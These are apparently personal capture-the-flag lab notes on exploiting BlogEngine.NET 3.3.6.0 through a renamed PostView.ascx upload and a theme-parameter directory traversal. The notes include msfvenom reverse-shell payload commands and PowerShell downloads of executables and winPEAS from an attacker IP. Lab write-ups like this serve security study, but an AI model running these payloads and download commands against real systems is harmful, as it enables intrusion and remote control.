BlogEngine.NET

Version: 3.3.6.0 

https://www.exploit-db.com/exploits/46353

change the exploit and rename to PostView.ascx


![[Pasted image 20210527190559.png]]


![[Pasted image 20210527191454.png]]
and publish

go to 
http://10.10.201.122/?theme=../../App_Data/files

and we got the shell 

![[Pasted image 20210527191738.png]]

![[Pasted image 20210527191809.png]]

## shell upgrade(meterpreter)
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o exploit.exe`

transfer and run

`cd C:\Windows\Temp`

`powershell -c wget "http://10.17.4.208/exploit.exe" -outfile exploit.exe`

![[Pasted image 20210527193137.png]]


## shell upgrade(without meterpreter)
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 -f exe -o exploit1.exe`

`powershell -c wget "http://10.17.4.208/exploit1.exe" -outfile exploit1.exe`

![[Pasted image 20210527210947.png]]

powershell -c wget "http://10.17.4.208/winpeas.bat" -outfile winpeas.bat

and running it does not show the sysinfo

![[Pasted image 20210527214553.png]]

also transferring the winpeasx64 was taking ages..

so run
`systeminfo | findstr /i date`

![[Pasted image 20210527214612.png]]